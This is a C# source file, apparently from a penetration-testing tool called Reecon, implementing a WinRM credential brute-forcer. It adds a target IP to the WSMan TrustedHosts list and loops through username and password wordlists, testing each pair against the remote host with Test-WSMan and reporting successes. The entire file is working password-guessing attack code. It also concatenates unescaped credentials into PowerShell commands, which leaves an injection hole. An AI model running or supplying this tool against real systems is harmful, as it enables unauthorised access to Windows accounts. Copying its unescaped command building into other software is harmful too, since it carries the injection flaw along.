using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace Reecon
{
    class WinRM
    {
        public static void WinRMBrute(string[] args)
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                Console.WriteLine("Error - This only works on Windows - Sorry :<");
                return;
            }

            if (args.Length != 4)
            {
                Console.WriteLine("WinRM Brute Usage: reecon -winrm-brute IP Userfile Passfile");
                return;
            }
            string ip = args[1];
            string userFile = args[2];
            string passFile = args[3];
            if (!File.Exists(userFile))
            {
                Console.WriteLine("Unable to find UserFile: " + userFile);
                return;
            }
            if (!File.Exists(passFile))
            {
                Console.WriteLine("Unable to find Passfile: " + passFile);
                return;
            }
            List<string> userList = File.ReadAllLines(userFile).ToList();
            List<string> passList = File.ReadAllLines(passFile).ToList();

            // Perms
            List<string> permLines = General.GetProcessOutput("powershell", @"Set-Item WSMan:\localhost\Client\TrustedHosts " + ip + " -Force");
            if (permLines.Count != 0)
            {
                if (permLines[0].Trim() == "Set-Item : Access is denied.")
                {
                    Console.WriteLine("You need to run Reecon in an Administrative console for this functionality");
                    return;
                }
            }
            foreach (string user in userList)
            {
                foreach (string pass in passList)
                {
                    Console.Write("Testing " + user + ":" + pass + " - ");
                    List<string> processResult = General.GetProcessOutput("powershell", "$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ('" + user + "', (ConvertTo-SecureString \"" + pass + "\" -AsPlainText -Force)); Test-WSMan -ComputerName " + ip + " -Credential $creds -Authentication Negotiate -erroraction SilentlyContinue");
                    if (processResult.Count != 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Success!");
                        Console.ForegroundColor = ConsoleColor.White;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Failed");
                        Console.ForegroundColor = ConsoleColor.White;

                    }
                }
            }
            General.RunProcess("powershell", @"Set-Item WSMan:\localhost\Client\TrustedHosts '' -Force");
        }
    }
}
